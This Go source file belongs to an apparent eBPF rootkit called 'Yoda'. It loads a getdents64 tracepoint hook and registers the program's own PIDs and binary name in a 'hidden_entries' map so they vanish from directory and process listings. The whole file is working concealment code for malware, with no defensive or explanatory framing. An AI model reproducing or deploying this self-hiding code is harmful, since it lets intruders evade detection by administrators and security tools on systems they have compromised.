// Package core provides utilities to manage hidden PIDs and binary file via eBPF getdents hook.
package core

import (
	"fmt"
	"log"
	"os"
	"path/filepath"
	"strconv"
	"strings"

	"github.com/cilium/ebpf"
	"github.com/cilium/ebpf/link"
)

const (
	BpfObjPath = "bpf/getdents.o"
	MaxHidden  = 16
	MaxNameLen = 100
)

type HiddenEntry struct {
	Name    [MaxNameLen]byte
	NameLen int32
}

// getYodaPIDs returns all PIDs of running processes whose executable matches the current binary name.
func getYodaPIDs() ([]int, error) {
	selfExe, err := os.Readlink("/proc/self/exe")
	if err != nil {
		return nil, fmt.Errorf("failed to read /proc/self/exe: %w", err)
	}
	binaryName := filepath.Base(selfExe)
	entries, err := os.ReadDir("/proc")
	if err != nil {
		return nil, fmt.Errorf("failed to list /proc: %w", err)
	}
	var pids []int
	for _, entry := range entries {
		if !entry.IsDir() {
			continue
		}
		pid, err := strconv.Atoi(entry.Name())
		if err != nil {
			continue
		}
		exePath := fmt.Sprintf("/proc/%d/exe", pid)
		target, err := os.Readlink(exePath)
		found := false
		if err == nil && strings.Contains(target, binaryName) {
			found = true
		} else {
			// Check cmdline if exe doesn't match
			cmdlinePath := fmt.Sprintf("/proc/%d/cmdline", pid)
			cmdlineBytes, err := os.ReadFile(cmdlinePath)
			if err == nil {
				cmdline := string(cmdlineBytes)
				if strings.Contains(cmdline, binaryName) {
					found = true
				}
			}
		}
		if found {
			pids = append(pids, pid)
		}
	}
	fmt.Printf("getYodaPIDs: %v\n", pids)
	return pids, nil
}

// getBinaryName returns the basename of the current executable.
func getBinaryName() (string, error) {
	selfExe, err := os.Readlink("/proc/self/exe")
	if err != nil {
		return "", fmt.Errorf("failed to read /proc/self/exe: %w", err)
	}
	return filepath.Base(selfExe), nil
}

// loadGetdentsBPF loads the getdents.o eBPF object file and returns the collection.
func loadGetdentsBPF() (*ebpf.Collection, error) {
	spec, err := ebpf.LoadCollectionSpec(BpfObjPath)
	if err != nil {
		return nil, fmt.Errorf("failed to load BPF spec: %w", err)
	}
	coll, err := ebpf.NewCollection(spec)
	if err != nil {
		return nil, fmt.Errorf("failed to create BPF collection: %w", err)
	}
	return coll, nil
}

// populateHiddenEntries populates the hidden_entries map with the given PIDs as strings.
// populateHiddenEntries ajoute les PIDs et le nom du binaire à la map hidden_entries.
func populateHiddenEntries(hiddenMap *ebpf.Map, pids []int, binName string) error {
	idx := 0
	for _, pid := range pids {
		if idx >= MaxHidden {
			break
		}
		pidStr := strconv.Itoa(pid)
		var entry HiddenEntry
		copy(entry.Name[:], pidStr)
		entry.NameLen = int32(len(pidStr))
		key := uint32(idx)
		if err := hiddenMap.Update(&key, &entry, ebpf.UpdateAny); err != nil {
			return fmt.Errorf("failed to update hidden_entries[%d]: %w", idx, err)
		}
		idx++
	}
	if idx < MaxHidden && binName != "" {
		var entry HiddenEntry
		copy(entry.Name[:], binName)
		entry.NameLen = int32(len(binName))
		key := uint32(idx)
		if err := hiddenMap.Update(&key, &entry, ebpf.UpdateAny); err != nil {
			return fmt.Errorf("failed to update hidden_entries[%d] (binName): %w", idx, err)
		}
	}
	return nil
}

// HideOwnPIDs loads the BPF program and populates the hidden_entries map with this program's PIDs.
func HideOwnPIDs() (enterLink, exitLink link.Link, err error) {
	pids, err := getYodaPIDs()
	if err != nil {
		return nil, nil, err
	}
	binName, err := getBinaryName()
	if err != nil {
		return nil, nil, err
	}
	coll, err := loadGetdentsBPF()
	if err != nil {
		return nil, nil, err
	}
	hiddenMap, ok := coll.Maps["hidden_entries"]
	if !ok {
		return nil, nil, fmt.Errorf("hidden_entries map not found in BPF object")
	}
	if err := populateHiddenEntries(hiddenMap, pids, binName); err != nil {
		return nil, nil, err
	}

	enterProg, ok := coll.Programs["hook_getdents64_enter"]
	if !ok {
		return nil, nil, fmt.Errorf("hook_getdents64_enter program not found in BPF object")
	}
	exitProg, ok := coll.Programs["hook_getdents64_exit"]
	if !ok {
		return nil, nil, fmt.Errorf("hook_getdents64_exit program not found in BPF object")
	}
	enterLink, err = link.Tracepoint("syscalls", "sys_enter_getdents64", enterProg, nil)
	if err != nil {
		return nil, nil, fmt.Errorf("failed to attach sys_enter_getdents64: %w", err)
	}
	exitLink, err = link.Tracepoint("syscalls", "sys_exit_getdents64", exitProg, nil)
	if err != nil {
		enterLink.Close()
		return nil, nil, fmt.Errorf("failed to attach sys_exit_getdents64: %w", err)
	}
	log.Printf("Populated hidden_entries with PIDs: %v and binary name: %s", pids, binName)
	return enterLink, exitLink, nil
}

func CloseLinks(links ...link.Link) {
	for _, l := range links {
		if l != nil {
			_ = l.Close()
		}
	}
}
